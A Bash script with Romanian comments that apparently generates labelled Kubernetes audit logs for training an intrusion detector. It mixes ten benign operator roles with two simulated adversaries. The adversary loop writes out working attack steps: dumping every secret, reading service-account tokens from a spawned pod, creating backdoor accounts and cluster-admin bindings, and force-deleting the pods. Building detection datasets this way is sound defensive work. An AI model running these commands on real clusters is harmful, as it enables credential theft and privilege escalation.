#!/bin/bash
# Generează trafic ETICHETAT, specific fiecărui rol (nu bucle identice).
# 10 actori benigni (operațiuni reale) + 2 atacatori (kill-chain). Variație pe rundă.
set -uo pipefail
W=/tmp/ids_collect
K() { kubectl --kubeconfig "$W/kubeconfig-$1" "${@:2}" >/dev/null 2>&1 || true; }
ROUNDS="${ROUNDS:-6}"
WIN=$W/windows.txt; : > "$WIN"

# namespace-uri pentru workload-uri benigne (ca admin)
for ns in apps data ci; do kubectl create namespace "$ns" >/dev/null 2>&1 || true; done
NODE="$(kubectl get nodes -o jsonpath='{.items[0].metadata.name}' 2>/dev/null)"

echo "BENIGN_START=$(date -u +%Y-%m-%dT%H:%M:%SZ)" | tee -a "$WIN"
for r in $(seq 1 "$ROUNDS"); do
  echo "  runda benignă $r/$ROUNDS"
  # 1. SRE on-call — triaj incidente (read/monitor)
  K sre-oncall get pods -A; K sre-oncall get events -A --field-selector type=Warning
  K sre-oncall get nodes; K sre-oncall describe node "$NODE"; K sre-oncall get pods -n kube-system
  # 2. SRE reliability — SLO/scalare
  K sre-reliability get deployments -A; K sre-reliability get hpa -A
  K sre-reliability create deployment slo-$r --image=nginx -n apps; K sre-reliability scale deployment slo-$r --replicas=2 -n apps
  K sre-reliability get pods -n apps
  # 3. DevOps pipeline — CI/CD
  K devops-pipeline create deployment app-$r --image=nginx -n ci; K devops-pipeline expose deployment app-$r --port=80 -n ci
  K devops-pipeline rollout status deployment/app-$r -n ci --timeout=3s; K devops-pipeline get pods -n ci
  # 4. DevOps release — release mgmt
  K devops-release set image deployment/app-$r app-$r=nginx:1.25 -n ci; K devops-release rollout restart deployment/app-$r -n ci
  K devops-release get replicasets -n ci; K devops-release annotate deployment/app-$r note=rel$r -n ci --overwrite
  # 5. Platform engineer — operatori/CRD/config
  K platform-engineer get crds; K platform-engineer get apiservices; K platform-engineer create configmap cfg-$r --from-literal=k=v -n apps
  K platform-engineer get configmaps -A; K platform-engineer get storageclasses
  # 6. Platform networking — rețea
  K platform-networking get services -A; K platform-networking get endpoints -A
  K platform-networking get ingresses -A; K platform-networking get networkpolicies -A; K platform-networking create service clusterip net-$r --tcp=80:80 -n apps
  # 7. System administrator — noduri/namespace/quota
  K system-administrator get namespaces; K system-administrator get resourcequotas -A
  K system-administrator create resourcequota q-$r --hard=pods=10 -n data; K system-administrator get limitranges -A; K system-administrator get nodes -o wide
  # 8. Security auditor — audit read-only (incl. citiri RBAC — benign, dar seamănă cu recon)
  K security-auditor get roles -A; K security-auditor get rolebindings -A
  K security-auditor get clusterroles; K security-auditor get clusterrolebindings; K security-auditor get serviceaccounts -A
  # 9. Backend developer — deploy + logs + exec PROPRIU
  K backend-developer create deployment be-$r --image=nginx -n apps; K backend-developer get pods -n apps
  POD="$(kubectl --kubeconfig $W/kubeconfig-backend-developer get pods -n apps -o jsonpath='{.items[0].metadata.name}' 2>/dev/null || true)"
  [ -n "$POD" ] && K backend-developer logs "$POD" -n apps --tail=2
  [ -n "$POD" ] && K backend-developer exec "$POD" -n apps -- echo ok
  # 10. Data engineer — jobs/cronjobs/config/pvc
  K data-engineer create job job-$r --image=busybox -n data -- echo hi; K data-engineer get jobs -A
  K data-engineer get cronjobs -A; K data-engineer get pvc -A; K data-engineer get configmaps -n data
done
echo "BENIGN_END=$(date -u +%Y-%m-%dT%H:%M:%SZ)" | tee -a "$WIN"

echo "ATTACK_START=$(date -u +%Y-%m-%dT%H:%M:%SZ)" | tee -a "$WIN"
for ep in $(seq 1 "$ROUNDS"); do
  echo "  episod atac $ep/$ROUNDS"
  # 11. adversary-external — kill-chain complet (cont compromis cluster-admin)
  K adversary-external get secrets -A; K adversary-external get serviceaccounts -A
  K adversary-external get clusterroles; K adversary-external get clusterrolebindings; K adversary-external get pods -A -o wide
  for s in $(kubectl --kubeconfig $W/kubeconfig-adversary-external get secrets -A -o jsonpath='{range .items[*]}{.metadata.namespace}/{.metadata.name}{"\n"}{end}' 2>/dev/null | head -6); do
    K adversary-external get secret "${s#*/}" -n "${s%/*}" -o yaml
  done
  K adversary-external run pwn-$ep --image=alpine --restart=Never -- sleep 3600
  kubectl --kubeconfig $W/kubeconfig-adversary-external wait --for=condition=ready pod/pwn-$ep --timeout=30s >/dev/null 2>&1 || true
  K adversary-external exec pwn-$ep -- sh -c "id; cat /var/run/secrets/kubernetes.io/serviceaccount/token"
  K adversary-external create clusterrolebinding pwn-$ep --clusterrole=cluster-admin --serviceaccount=default:default
  K adversary-external delete pod pwn-$ep --force --grace-period=0

  # 12. adversary-insider — abuz acces legit (edit): exfil secrete + backdoor; escaladarea e refuzată (dar auditată)
  K adversary-insider get secrets -A;
  for s in $(kubectl --kubeconfig $W/kubeconfig-adversary-insider get secrets -n kube-system -o jsonpath='{range .items[*]}{.metadata.name}{"\n"}{end}' 2>/dev/null | head -5); do
    K adversary-insider get secret "$s" -n kube-system -o yaml
  done
  K adversary-insider create serviceaccount backdoor-$ep -n default; K adversary-insider create token backdoor-$ep -n default
  K adversary-insider run shadow-$ep --image=alpine --restart=Never -n default -- sleep 3600
  kubectl --kubeconfig $W/kubeconfig-adversary-insider wait --for=condition=ready pod/shadow-$ep -n default --timeout=30s >/dev/null 2>&1 || true
  K adversary-insider exec shadow-$ep -n default -- sh -c "cat /var/run/secrets/kubernetes.io/serviceaccount/token"
  K adversary-insider create clusterrolebinding insider-$ep --clusterrole=cluster-admin --serviceaccount=default:backdoor-$ep
  K adversary-insider delete pod shadow-$ep -n default --force --grace-period=0
done
echo "ATTACK_END=$(date -u +%Y-%m-%dT%H:%M:%SZ)" | tee -a "$WIN"

echo ">> curățenie workload-uri benigne + artefacte"
for ns in apps data ci; do kubectl delete namespace "$ns" >/dev/null 2>&1 || true; done
for ep in $(seq 1 "$ROUNDS"); do
  kubectl delete clusterrolebinding pwn-$ep insider-$ep >/dev/null 2>&1 || true
  kubectl delete serviceaccount backdoor-$ep -n default >/dev/null 2>&1 || true
done
echo "GATA. Ferestre:"; grep -E "_START|_END" "$WIN"
